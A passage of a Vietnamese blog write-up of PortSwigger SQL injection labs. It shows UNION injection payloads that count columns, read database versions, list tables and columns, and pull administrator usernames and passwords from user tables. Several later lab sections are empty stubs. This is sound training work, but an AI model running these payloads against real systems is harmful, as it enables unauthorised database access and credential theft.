+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">someTable</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> (<span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>) <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/6bc8e7d8-3489-4f87-9037-1581c026b061"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/6bc8e7d8-3489-4f87-9037-1581c026b061, https://github.com/g03m0n/pics/assets/130943529/6bc8e7d8-3489-4f87-9037-1581c026b061 1.5x, https://github.com/g03m0n/pics/assets/130943529/6bc8e7d8-3489-4f87-9037-1581c026b061 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/6bc8e7d8-3489-4f87-9037-1581c026b061"
+        title="image" /></p>
+<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,banner FROM v$version --'</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#a6e22e">banner</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">v</span>$version <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/dd447be6-5f4c-4876-aaa5-577bff3aed6c"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/dd447be6-5f4c-4876-aaa5-577bff3aed6c, https://github.com/g03m0n/pics/assets/130943529/dd447be6-5f4c-4876-aaa5-577bff3aed6c 1.5x, https://github.com/g03m0n/pics/assets/130943529/dd447be6-5f4c-4876-aaa5-577bff3aed6c 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/dd447be6-5f4c-4876-aaa5-577bff3aed6c"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/6e71a454-3857-457f-9dae-605630d25a9c"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/6e71a454-3857-457f-9dae-605630d25a9c, https://github.com/g03m0n/pics/assets/130943529/6e71a454-3857-457f-9dae-605630d25a9c 1.5x, https://github.com/g03m0n/pics/assets/130943529/6e71a454-3857-457f-9dae-605630d25a9c 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/6e71a454-3857-457f-9dae-605630d25a9c"
+        title="image" /></p>
+<h2 id="4-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">4. SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-3">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
+<h3 id="step-3">Step</h3>
+<p>Lab này tương tự như lab về <a href="#3-sql-injection-attack-querying-the-database-type-and-version-on-oracle" rel="">Oracle Datable</a>
+ nhưng sử dụng MySQL Database.
+Đầu tiên ta cũng dự đoán số cột tương tự <a href="#step-2" rel="">lab 3</a>
+ .
+Database lần này cũng gồm 2 cột sau khi thử: <code>Accessories' UNION SELECT NULL,NULL --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/43ab0cd4-818f-4b73-b72e-b4fe1623432e"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/43ab0cd4-818f-4b73-b72e-b4fe1623432e, https://github.com/g03m0n/pics/assets/130943529/43ab0cd4-818f-4b73-b72e-b4fe1623432e 1.5x, https://github.com/g03m0n/pics/assets/130943529/43ab0cd4-818f-4b73-b72e-b4fe1623432e 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/43ab0cd4-818f-4b73-b72e-b4fe1623432e"
+        title="image" /></p>
+<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,@@version --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/a332d405-ea94-4692-87dc-01c5e4a08612"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a332d405-ea94-4692-87dc-01c5e4a08612, https://github.com/g03m0n/pics/assets/130943529/a332d405-ea94-4692-87dc-01c5e4a08612 1.5x, https://github.com/g03m0n/pics/assets/130943529/a332d405-ea94-4692-87dc-01c5e4a08612 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/a332d405-ea94-4692-87dc-01c5e4a08612"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/5a5c3803-2cd7-42b0-a884-68982edd8373"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/5a5c3803-2cd7-42b0-a884-68982edd8373, https://github.com/g03m0n/pics/assets/130943529/5a5c3803-2cd7-42b0-a884-68982edd8373 1.5x, https://github.com/g03m0n/pics/assets/130943529/5a5c3803-2cd7-42b0-a884-68982edd8373 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/5a5c3803-2cd7-42b0-a884-68982edd8373"
+        title="image" /></p>
+<h2 id="5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">5. SQL injection attack, listing the database contents on non-Oracle databases</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-4">Description</h3>
+<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Tuy vậy, ta chưa biết database loại nào mà chỉ biết nó không phải là Oracle mà thôi.</p>
+<h3 id="step-4">Step</h3>
+<p>Đầu tiên, ta sẽ dò số cột trong database:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/be23cc16-ac79-472d-a614-6c221cb41210"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/be23cc16-ac79-472d-a614-6c221cb41210, https://github.com/g03m0n/pics/assets/130943529/be23cc16-ac79-472d-a614-6c221cb41210 1.5x, https://github.com/g03m0n/pics/assets/130943529/be23cc16-ac79-472d-a614-6c221cb41210 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/be23cc16-ac79-472d-a614-6c221cb41210"
+        title="image" /></p>
+<p>Như vậy ta đã biết trong database có 2 cột.
+Thử một số cách kiểm tra <code>version</code> của database ta có thể biết được server dụng <code>PostgreSQL</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/f5146dd6-4243-4d61-a051-3f64450bd861"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/f5146dd6-4243-4d61-a051-3f64450bd861, https://github.com/g03m0n/pics/assets/130943529/f5146dd6-4243-4d61-a051-3f64450bd861 1.5x, https://github.com/g03m0n/pics/assets/130943529/f5146dd6-4243-4d61-a051-3f64450bd861 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/f5146dd6-4243-4d61-a051-3f64450bd861"
+        title="image" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/ab0e5cd9-869e-4d8e-a3ae-55d086781490"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/ab0e5cd9-869e-4d8e-a3ae-55d086781490, https://github.com/g03m0n/pics/assets/130943529/ab0e5cd9-869e-4d8e-a3ae-55d086781490 1.5x, https://github.com/g03m0n/pics/assets/130943529/ab0e5cd9-869e-4d8e-a3ae-55d086781490 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/ab0e5cd9-869e-4d8e-a3ae-55d086781490"
+        title="image" /></p>
+<p>Ta sử dụng payload này để kiểm tra tên bảng có trong database: <code>' UNION SELECT NULL, table_name FROM information_schema.tables --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/afbeeacd-34f9-431f-98ef-710730e6123f"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/afbeeacd-34f9-431f-98ef-710730e6123f, https://github.com/g03m0n/pics/assets/130943529/afbeeacd-34f9-431f-98ef-710730e6123f 1.5x, https://github.com/g03m0n/pics/assets/130943529/afbeeacd-34f9-431f-98ef-710730e6123f 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/afbeeacd-34f9-431f-98ef-710730e6123f"
+        title="image" /></p>
+<p>Có 2 bảng là <code>pg_user</code> và <code>users_excods</code>
+Kiểm tra lần lượt các cột trong 2 bảng này thì phát hiện ra trong bảng <code>user_excods</code> có 2 cột khả nghi.</p>
+<p>Payload: <code>' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users_excods' --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/79d18845-ea22-4da3-8a98-2d518a6556eb"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/79d18845-ea22-4da3-8a98-2d518a6556eb, https://github.com/g03m0n/pics/assets/130943529/79d18845-ea22-4da3-8a98-2d518a6556eb 1.5x, https://github.com/g03m0n/pics/assets/130943529/79d18845-ea22-4da3-8a98-2d518a6556eb 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/79d18845-ea22-4da3-8a98-2d518a6556eb"
+        title="image" /></p>
+<p>Kiểm tra 2 cột, ta biết được tài khoản/mật khẩu của <code>administrator</code>.</p>
+<p>Payload: <code>' UNION SELECT username_tjzvcx, password_ligkez FROM users_excods --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/4fdb6294-d823-43ca-a52c-b2f76bb1a2ed"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/4fdb6294-d823-43ca-a52c-b2f76bb1a2ed, https://github.com/g03m0n/pics/assets/130943529/4fdb6294-d823-43ca-a52c-b2f76bb1a2ed 1.5x, https://github.com/g03m0n/pics/assets/130943529/4fdb6294-d823-43ca-a52c-b2f76bb1a2ed 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/4fdb6294-d823-43ca-a52c-b2f76bb1a2ed"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/0a4ac736-2d3b-4b75-bcd0-b13c851b2f8f"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/0a4ac736-2d3b-4b75-bcd0-b13c851b2f8f, https://github.com/g03m0n/pics/assets/130943529/0a4ac736-2d3b-4b75-bcd0-b13c851b2f8f 1.5x, https://github.com/g03m0n/pics/assets/130943529/0a4ac736-2d3b-4b75-bcd0-b13c851b2f8f 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/0a4ac736-2d3b-4b75-bcd0-b13c851b2f8f"
+        title="image" /></p>
+<h2 id="6-sql-injection-attack-listing-the-database-contents-on-oracle">6. SQL injection attack, listing the database contents on Oracle</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-5">Description</h3>
+<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Sử dụng Oracle Database.</p>
+<h3 id="step-5">Step</h3>
+<p>Giống với <a href="#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases" rel="">lab 5</a>
+ ở trên nên mình sẽ làm tương tự.</p>
+<p>Payload: <code>' UNION SELECT NULL, table_name from all_tables --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d, https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d 1.5x, https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a, https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a 1.5x, https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a"
+        title="image" /></p>
+<p>Tìm được bảng có tên <code>USERS_JBIWMO</code>.
+Tiếp tục tìm kiếm các cột có trong bảng <code>USERS_JBIWMO</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811, https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811 1.5x, https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811"
+        title="image" /></p>
+<p>Ta tìm được tài khoản/mật khẩu của <code>administrator</code> với payload:</p>
+<p>Payload: <code>' UNION SELECT USERNAME_EYKUIK, PASSWORD_ISAXTU FROM USERS_JBIWMO --'</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf, https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf 1.5x, https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344, https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344 1.5x, https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344"
+        title="image" /></p>
+<h2 id="7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">7. SQL injection UNION attack, determining the number of columns returned by the query</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-6">Description</h3>
+<p>Bài lab yêu cầu ta xác định số cột của bảng bằng cách sử dụng SQL injection UNION attack.</p>
+<h3 id="step-6">Step</h3>
+<p>Tương tự cách xác định cột tại <a href="#step-3" rel="">đây</a>
+.</p>
+<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/82247e56-8151-4cb7-916c-de377c7241d3"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/82247e56-8151-4cb7-916c-de377c7241d3, https://github.com/g03m0n/pics/assets/130943529/82247e56-8151-4cb7-916c-de377c7241d3 1.5x, https://github.com/g03m0n/pics/assets/130943529/82247e56-8151-4cb7-916c-de377c7241d3 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/82247e56-8151-4cb7-916c-de377c7241d3"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/4a467a23-0918-48fd-8bfa-b1f23e91d2b5"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/4a467a23-0918-48fd-8bfa-b1f23e91d2b5, https://github.com/g03m0n/pics/assets/130943529/4a467a23-0918-48fd-8bfa-b1f23e91d2b5 1.5x, https://github.com/g03m0n/pics/assets/130943529/4a467a23-0918-48fd-8bfa-b1f23e91d2b5 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/4a467a23-0918-48fd-8bfa-b1f23e91d2b5"
+        title="image" /></p>
+<h2 id="8-sql-injection-union-attack-finding-a-column-containing-text">8. SQL injection UNION attack, finding a column containing text</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-7">Description</h3>
+<p>Bài lab yêu cầu ta tìm chuỗi dữ liệu cho trước <code>64fl9W</code> bằng cách sử dụng SQL injection UNION attack.</p>
+<h3 id="step-7">Step</h3>
+<p>Đầu tiên ta cũng <a href="#step-3" rel="">xác định số cột của bảng</a>
+.</p>
+<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/8a4e24f1-d76c-4c29-b012-d77e657bad4c"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/8a4e24f1-d76c-4c29-b012-d77e657bad4c, https://github.com/g03m0n/pics/assets/130943529/8a4e24f1-d76c-4c29-b012-d77e657bad4c 1.5x, https://github.com/g03m0n/pics/assets/130943529/8a4e24f1-d76c-4c29-b012-d77e657bad4c 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/8a4e24f1-d76c-4c29-b012-d77e657bad4c"
+        title="image" /></p>
+<p>Với UNION Attack, ta có thể tìm một cột chưa giá trị loại <code>string</code> bằng cách thử chèn đoạn <code>string</code> cần tìm vào:</p>
+<p>Payload: <code>' UNION SELECT NULL, '64fl9W' ,NULL --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/df780ef4-9b39-4abb-85a2-8773202bd06b"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/df780ef4-9b39-4abb-85a2-8773202bd06b, https://github.com/g03m0n/pics/assets/130943529/df780ef4-9b39-4abb-85a2-8773202bd06b 1.5x, https://github.com/g03m0n/pics/assets/130943529/df780ef4-9b39-4abb-85a2-8773202bd06b 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/df780ef4-9b39-4abb-85a2-8773202bd06b"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/43637a06-8931-4b6b-a0c0-afcf3b956355"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/43637a06-8931-4b6b-a0c0-afcf3b956355, https://github.com/g03m0n/pics/assets/130943529/43637a06-8931-4b6b-a0c0-afcf3b956355 1.5x, https://github.com/g03m0n/pics/assets/130943529/43637a06-8931-4b6b-a0c0-afcf3b956355 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/43637a06-8931-4b6b-a0c0-afcf3b956355"
+        title="image" /></p>
+<h2 id="9-sql-injection-union-attack-retrieving-data-from-other-tables">9. SQL injection UNION attack, retrieving data from other tables</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-8">Description</h3>
+<h3 id="step-8">Step</h3>
+<h2 id="10-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">10. SQL injection UNION attack, retrieving multiple values in a single column</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description-9">Description</h3>
+<h3 id="step-9">Step</h3>
+<h2 id="11-blind-sql-injection-with-conditional-responses">11. Blind SQL injection with conditional responses</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-10">Description</h3>
+<h3 id="step-10">Step</h3>
+<h2 id="12-blind-sql-injection-with-conditional-errors">12. Blind SQL injection with conditional errors</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-11">Description</h3>
+<h3 id="step-11">Step</h3>
+<h2 id="13">13.</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-12">Description</h3>
+<h3 id="step-12">Step</h3>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-01-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/" data-title="PortSwigger - SQL Injection" data-hashtags="portswigger,lab,ctf"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/" data-hashtag="portswigger"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/" data-title="PortSwigger - SQL Injection"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/portswigger/">Portswigger</a>,&nbsp;<a href="/tags/lab/">Lab</a>,&nbsp;<a href="/tags/ctf/">Ctf</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/cookiectf---baby-crawler/" class="prev" rel="prev" title="CookieCTF - Baby Crawler"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CookieCTF - Baby Crawler</a>
+            <a href="/posts/cookiectf---the-existed-file/cookiectf-the-existed-file/" class="next" rel="next" title="CookieCTF - The Existed File">CookieCTF - The Existed File<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="fb-root" class="comment"></div>
+            <div
+                class="fb-comments"
+                data-href="https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/"
+                data-width="100%"
+                data-numposts="10"
+            ></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://developers.facebook.com/docs/plugins/comments/"></a>Facebook</a>.
+            </noscript><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.132.2">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.css"><script type="text/javascript" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v5.0&amp;appId=2950291851778582&amp;autoLogAppEvents=1" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/mhchem.min.js"></script><script 